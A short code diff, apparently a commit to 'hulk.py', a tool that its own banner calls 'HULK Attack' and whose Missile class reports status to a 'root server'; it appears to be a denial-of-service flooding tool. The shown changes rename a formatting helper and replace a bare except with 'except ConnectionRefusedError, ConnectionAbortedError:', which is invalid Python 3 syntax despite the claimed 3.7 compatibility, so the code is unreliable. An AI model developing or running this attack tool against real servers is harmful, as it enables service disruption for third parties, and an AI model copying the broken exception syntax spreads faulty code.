@@ -159,12 +159,12 @@ class Missile():
         try:
             self.root.sendall(str(status_list).encode())
             return 0
-        except:
+        except ConnectionRefusedError, ConnectionAbortedError:
             return -1
 
 if __name__ == "__main__":
     async def main(root, url):
-        def format(text):
+        def bordered(text):
             sentences = text.splitlines()
             hor = max(len(line) for line in sentences) + 2
             pad = ['┌' + '─' * hor + '┐']
@@ -180,7 +180,7 @@ if __name__ == "__main__":
 
         if invalid_args():
             print(
-                format(
+                bordered(
                     'USAGE: python hulk.py <root_server-IP>\n\n'
                     'Example: python hulk.py localhost\n'
                 )
@@ -188,7 +188,7 @@ if __name__ == "__main__":
             sys.exit()
 
         print(
-            format(
+            bordered(
                 "-- HULK Attack Started --\n\n"
                 "Current Version: 3.0\n\n"
                 "Compatible with: Python 3.7\n\n"
